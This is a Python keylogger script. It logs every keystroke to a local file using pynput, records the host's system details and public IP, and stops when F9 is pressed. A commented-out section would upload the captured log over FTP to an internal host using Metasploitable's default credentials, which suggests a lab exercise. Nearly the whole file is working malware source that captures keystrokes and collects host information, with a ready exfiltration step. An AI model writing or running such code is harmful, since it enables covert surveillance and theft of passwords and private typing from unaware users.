import socket
import platform
from pynput.keyboard import Key, Listener
import ftplib
import logging
from urllib.request import urlopen


logdir = ""
logging.basicConfig(filename=logdir+"logs.txt",level=logging.DEBUG,format="%(asctime)s:%(message)s")


def pressing_key(key):
	try:
		logging.info(str(key))
	except AttributeError:
		print(f"A special key {key} has been pressed")


def releasing_key(key):
	if key == Key.f9:
		return False


# def getip():
# 	return socket.gethostbyname(socket.gethostname())


def internet_on():
	try:
		response = urlopen('https://www.google.com', timeout=20)
		return True
	except:
		pass
	return False


def sysinfo():
	return platform.uname()


def getpublicip():
	try:
		return str((urlopen('http://ip.42.pl/raw').read())).replace("b","")
	except:
		pass


with open('logs.txt', 'a') as f:
	f.write(str(sysinfo())+"\n")
	f.write("IP Address is:"+getpublicip()+"\n")

print("Started Listening...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
	listener.join()

# print("Connecting to FTP\n")
#
# sess = ftplib.FTP("192.168.0.102", "msfadmin",  "msfadmin")
# file = open("klog-res.txt", "rb")
# sess.storbinary("STOR klog-res.txt", file)
# file.close()
# sess.quit()
